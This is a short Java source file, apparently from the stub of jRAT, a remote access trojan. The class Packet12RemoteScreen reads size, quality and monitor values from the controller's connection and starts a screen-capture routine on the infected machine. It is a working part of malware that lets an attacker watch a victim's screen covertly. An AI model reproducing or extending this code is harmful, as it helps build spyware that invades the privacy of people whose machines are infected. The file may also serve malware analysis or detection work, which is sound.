package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read() throws Exception {
		int size = Connection.readInt();
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		
		//new Thread(new Screen(repeat, size, quality, monitor)).run();
		new Screen(size, quality, monitor).run();
	}

}
